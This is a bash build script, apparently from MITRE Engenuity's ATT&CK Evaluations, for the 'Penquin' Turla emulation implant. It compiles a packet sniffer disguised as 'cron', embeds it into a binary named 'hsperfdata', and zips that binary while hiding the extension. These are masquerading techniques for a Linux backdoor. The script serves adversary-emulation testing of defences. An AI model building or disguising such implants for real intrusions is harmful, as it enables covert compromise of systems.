#!/bin/bash
# ---------------------------------------------------------------------------
# build_penquin - Bash shell script to automate the binary of the Penquin emulation software used for ATT&CK Evaluations Turla Round. 

# Copyright 2020-2021 MITRE Engenuity. Approved for public release.
# Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.

# This project makes use of ATT&CK®
# ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/ 

# Usage: build_penquin [[-h|--help]
#        build_penquin [-q|--quiet] [-s|--root] [script]]


# ---------------------------------------------------------------------------
PROGNAME=${0##*/}
VERSION="1.0"

# Prettify output
GREEN='\033[1;32m'
CYAN='\033[1;36m'
PURPLE='\033[1;35m'
PINK='\033[1;31m'
NC='\033[0m' # No Color

printf "
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::___::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::-'    \`-::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::-'          \`::::::::::::::::
:::::::::::::::::::::::::::::::::::::::-  '     ${PINK}_o)${NC}    \`:::::::::::::::
:::::::::::::::::::::::::::::::::::-'    |      ${PINK}//\ ${NC}    :::::::::::::::
::::::::::::::::::::::::::::::::-         .     ${PINK}V_/_${NC}    ,::::::::::::::
::::::::::::::::::::::::::::-'             .          ,::::::::::::::::
:::::::::::::::::::::::::-'                    `-`.___.-::::::::::::::::::
:::::::::::::::::::::-'                  _,,-::::::::::::::::::::::::::
::::::::::::::::::-'                _,--:::::::::::::::::::::::::::::::
::::::::::::::-'               _.--:::::::::::::::::::::::#####::::::::
:::::::::::-'             _.--::::::::::::::::::::::::::::#####:::::###
::::::::'      ##    ###.-:::::::###::::::::::::::::::::::#####:::::###
::::-'        _##_.::###:::::::::###::::::::::::::#####:##########:::##
:'          .:###:::#####::::::::###::::::::::::::#####:##########:::##
      ...--:::###::#######:::::::###:::::######:::#####:##########:::##
 _ .--::##::::###:#########::::::###:::::######:::#####:###############
'#########::::###:##########:::#######:::######:::#####:###############
'#########:::################:#########::######:::#####################
##########:::##########################::##############################
##########:::##########################################################
##########:::##########################################################
#######################################################################
#######################################################################
#######################################################################
#######################################################################

------------------------------------------------
Gotham: https://asciiart.website/index.php?art=comics/batman
Paranoid Penguin: https://jr.co.il/humor/ascii-art-penguin.txt
------------------------------------------------
\n
"

# FUNCTIONS
#######################################
# check_file_exists
# Helper fuction that uses Linux test function to print if a file exists or does not exists
# ERROR: print statement for failed test
#######################################
function check_file_exists () {
    if test -f "$1"; then
         printf "${GREEN}✔ $1 exists${NC}\n"
     else 
         printf "${PINK}$1 does not exist${NC}\n"
     fi
}
# same fucntion as above but flipped for removal of files
function check_file_rm () {
    if test -f "$1"; then
    printf "${PINK}$1 exists${NC}\n"
     else 
    printf "${GREEN}✔ $1 does not exist${NC}\n"
     fi
}
#######################################
# check_exit_code
# Helper fuction that evaluates the exit code of the last run command
# ERROR: print statement for failed test
#######################################
function execute () {
    # read the command from an arguement
    $1
    if [ $? -eq 0 ]; then
        printf "${GREEN}✔ Success:${NC} $1\n"
    else [ $? -eq 0 ]
        printf "${PINK}ERROR: $1${NC}\n"
    fi
}
#######################################
# Compile sniffer
# checks sniffer c file exists
# calls the GCC command with the following flags: 
    # -s = strip the strings
    # -O3 = optimization option - decreases size, increases compilation time & performance 
    # -o cron = output file is called `cron`
    # -lpcap = statically linked library for pcap files
# checks if the cron file exists
# ERROR: exit 1 for each check/command with printf statements 
#######################################
function compile_sniffer () {
    check_file_exists ./sniff.c
    execute "gcc -s -O3 -o cron sniff.c -lpcap"
    check_file_exists ./cron
    printf "${GREEN}Success! ${PURPLE}Sniffer compiled as cron.\n\n"
}
#######################################
# create_header_file
# Dependency: uses cron binary from previous function called `compile_sniffer()`
# calls the xxd command to create a header file called cron.h
# checks if the cron.h file exists
# adds the `extern` declaration to variables in header cron.h header file
# checks variables
# ERROR: exit 1 for each check/command with printf statements 
# NOTE: `` are used rather than "" - use "``" if running into parsing errors
#######################################
function create_header_file () {
    execute `xxd -i cron > cron.h`
    check_file_exists ./cron.h
    printf "${PURPLE}Inserting ${NC}external ${PURPLE}variable into header file...\n"
    execute `sed -i 's/unsigned char/extern unsigned char/' cron.h`
    execute `sed -i 's/unsigned int/extern unsigned int/' cron.h`
    printf "${GREEN}Success! ${PURPLE}Header file modified.\n\n"
}
#######################################
# build_penquin
# Dependency: uses header-file from previous function called `create_header_file()`
# checks for main.c
# compiles hsperfdata with the cron.h, crypt.h, & main.c files
# zips the executable (keeps +x extension when in transit)
# removes the .zip extension with mv
# ERROR: exit 1 for each check/command with printf statements
#######################################
function build_penquin () {
    # compiling main executable
    check_file_exists ./main.c
    execute "gcc -s -w -O3 -o hsperfdata main.c"
    check_file_exists ./hsperfdata
    
    # zipping executable and removing .zip extention
    printf "${PURPLE}Zipping Penquin...\n"
    execute "zip hsperfdata.zip hsperfdata"
    sleep 1
    execute "mv ./hsperfdata.zip ./hsperfdata"
    check_file_exists ./hsperfdata

    printf "${GREEN}Success! ${PURPLE}Penquin compiled as hsperfdata & zipped\nNOTE: Without the extension of .zip\n\n"
}
#######################################
# cleanup_build
# removes cron executable
# removes cron.h header file
# ERROR: exit 1 for each check/command with printf statements 
#######################################
function cleanup_build () {
    execute "rm ./cron"
    check_file_rm ./cron
    execute "rm ./cron.h"
    check_file_rm ./cron.h
    printf "${PURPLE}Clean up complete\n"
}

# PROGRAM BODY

function main(){
    printf "${PURPLE}*********************     ${GREEN}So it begins...     ${PURPLE}*********************\n\n"
    # complies the listener using sniff.c
    printf "${PURPLE}Compiling the sniffer...\n"
    compile_sniffer

    # converts the listener into a headerfile to be embedded into the primary Penquin program
    printf "${PURPLE}Converting sniffer to a header file...\n"
    create_header_file

    # compiles the penquin program with crypt.h, cron.h, & main.c
    printf "${PURPLE}Compiling penquin & the embeding the header file...\n"
    build_penquin 

    #clean up build artifacts 
    printf "${PURPLE}Cleaning up build artifacts...\n"
    cleanup_build
    
    # prints the absolute path to the binary 
    printf "PATH to binary:\t$(cd "$(dirname "$1")" && pwd)/hsperfdata\n\n"
    printf "${PURPLE}*********************     ${GREEN}DONE!     ${PURPLE}*********************\n\n"

}
main "$@"
